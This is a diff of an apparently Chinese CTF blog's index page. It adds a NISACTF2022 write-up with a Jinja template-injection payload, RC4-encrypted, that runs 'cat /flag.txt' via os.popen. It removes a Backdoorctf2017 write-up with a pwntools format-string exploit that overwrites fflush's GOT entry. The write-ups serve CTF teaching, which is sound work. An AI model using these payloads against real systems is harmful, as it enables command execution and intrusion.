@@ -131,6 +131,43 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/09/04/NISACTF2022-isSecret-wp/" >NISACTF2022-isSecret-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-04
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2102">题目链接</a>  </p>
+<p>显示<code>Welcome To Find Secret</code></p>
+<p>访问<code>/secret</code>，看到<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
+<p>传secret参数<code>/secret?secret=123456</code>发现报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File &quot;/app/app.py&quot;, line 35, in secret</span></span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
+
+<p>RC4解密后进行render渲染，很明显直接模板注入</p>
+<h3 id="RC4加密脚本："><a href="#RC4加密脚本：" class="headerlink" title="RC4加密脚本："></a>RC4加密脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key=<span class="string">&quot;HereIsTreasure&quot;</span>, message=<span class="string">&quot;ciscn&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> % quote(cipher))</span><br><span class="line">    <span class="comment"># print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后传参secret，即可获取flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/09/04/NISACTF2022-isSecret-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/09/03/Hacklu2015-stackstuff-wp/" >nightmare 7.1.1.Hacklu2015-stackstuff-wp</a>
 								</h3>
 							</div>
@@ -580,62 +617,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/24/Backdoorctf2017-bbpwn-wp/" >nightmare 3.1.Backdoorctf2017 bbpwn-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-24
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/backdoor17_bbpwn">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checksec 32_new</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    </span><br><span class="line">$ ./32_new</span><br><span class="line">Hello baby pwner, whats your name?</span><br><span class="line">guyinatuxedo</span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye guyinatuxedo</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">200</span>]; <span class="comment">// [esp+18h] [ebp-200h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+E0h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+20Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello baby pwner, whats your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">200</span>, edata);</span><br><span class="line">  fflush(edata);</span><br><span class="line">  <span class="built_in">sprintf</span>(format, <span class="string">&quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>11# 获取输入置于<code>format</code>中</li>
-<li>13# 直接输出format（存在格式化字符串漏洞）</li>
-<li>18# 有后门函数flag</li>
-</ol>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>因为栈上地址无法泄露，我们不可获取栈地址从而写返回地址</p>
-<p>但是main最后还调用了库函数<code>fflush</code>，我们可以改写got表中它的真实地址为<code>flag</code>函数的地址，从而获取flag</p>
-<h3 id="n作用"><a href="#n作用" class="headerlink" title="%n作用"></a>%n作用</h3><p>把截至目前成功输出的字符数量以<code>int</code>型数据格式写入到对应地址</p>
-<h3 id="num-x作用"><a href="#num-x作用" class="headerlink" title="%{num}$x作用"></a>%{num}$x作用</h3><p>指定第<code>&#123;num&#125;</code>个参数进行输出&#x2F;写入     那么<code>printf(&quot;hhh%2$n&quot;, a, b)</code>也就是将<code>3</code>写入第二个参数<code>b</code><strong>指向的内存（注意不是改写b本身）</strong></p>
-<h3 id="覆盖方式"><a href="#覆盖方式" class="headerlink" title="覆盖方式"></a>覆盖方式</h3><p>从低字节向高字节覆盖，注意写入的值<strong>只增不减</strong> （因为输出只会多不会少），但我们通常只要保证低字节位为我们想要的值即可，溢出可以继续被覆盖</p>
-<p>例：		假如我们想写入<code>0x0862</code>，但我们目前就已经输出了<code>0x70</code>个字符</p>
-<ol>
-<li><p>法一：首先凑满<code>0x162</code>写入最低地址，再凑够<code>0x208</code>写入地址加一，假设溢出对后面没有太大影响的话就已经写入成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|62|01|</span><br><span class="line">|62|08|02|</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>法二：直接凑够<code>0x862</code>个字符写入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|62|08|</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./32_new&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./32_new&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x080487D7</span></span><br><span class="line"><span class="string">	c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x0804870B</span></span><br><span class="line">main = <span class="number">0x08048724</span></span><br><span class="line">fflush_got = belf.got[<span class="string">&#x27;fflush&#x27;</span>]</span><br><span class="line">payload = p32(fflush_got)			</span><br><span class="line">payload += p32(fflush_got + <span class="number">1</span>) + p32(fflush_got + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%185d%10$n&#x27;</span>        <span class="comment"># 0x10b-82=185		前面的输出就已经有82了，我们在最低字节处写入0x10b</span></span><br><span class="line">payload += <span class="string">b&#x27;%892d%11$n&#x27;</span>       <span class="comment"># 0x487-0x10b=892	第二字节处写入0x0487</span></span><br><span class="line">payload += <span class="string">b&#x27;%129d%12$n&#x27;</span>        <span class="comment"># 0x508-0x487=129	最后一个字节处写入0x0508</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;name?&#x27;</span>, payload)</span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-
-
-<hr>
-
-	
-	</div>
-  <a type="button" href="/2023/08/24/Backdoorctf2017-bbpwn-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -697,7 +678,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>50</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>51</span></a></li>
 		
 		</ul>
 	</div>
@@ -708,48 +689,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+			<li><a href="/tags/nssctf/">nssctf<span>56</span></a></li>
 		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
-		
-			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
-		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
-		
-			<li><a href="/tags/afr/">afr<span>2</span></a></li>
-		
-			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
-		
-			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
-		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
+			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
 		
 			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
 		
-			<li><a href="/tags/swampctf2019/">swampctf2019<span>1</span></a></li>
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
 		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
-		
-			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+			<li><a href="/tags/create-function/">create_function<span>2</span></a></li>
 		
 			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
-			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
+			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
+		
+			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
+		
+			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
+		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
+		
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
+		
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/php/">php<span>23</span></a></li>
+		
+			<li><a href="/tags/afr/">afr<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>114</span></a></li>
+		   <li><a href="/tags">...<span>118</span></a></li>
 		 
 		</ul>
 	</div>
@@ -760,6 +741,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
+      </li>
     
       <li>
         <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
@@ -775,10 +760,6 @@
     
       <li>
         <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
-      </li>
-    
-      <li>
-        <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
       </li>
     
   </ul>
